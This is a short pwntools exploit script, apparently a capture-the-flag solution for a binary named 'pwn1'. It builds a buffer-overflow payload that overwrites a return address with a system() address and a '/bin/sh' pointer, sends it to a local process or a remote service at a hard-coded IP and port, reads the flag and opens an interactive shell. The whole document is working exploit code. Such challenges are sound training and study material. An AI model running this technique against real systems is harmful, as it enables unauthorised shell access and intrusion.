from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn1"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("1.95.36.136", 2138)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

system = 0x80484f0
binsh = 0x0804893D
payload = b""

io.sendlineafter("Enter your name:", "a"*7)
io.sendlineafter("going?", "3")
ddebug("b xxx\ncontinue")
payload = b"tinyfattinyfattinyfa"
payload += b"\x02"
payload += b"tinyfattinyfatti"
payload += p32(system)
payload += b"b"*4
payload += p32(binsh)
payload = payload.ljust(258, b"a")

io.sendlineafter("shell:", payload)

io.sendline(b"cat flag*")
io.interactive()
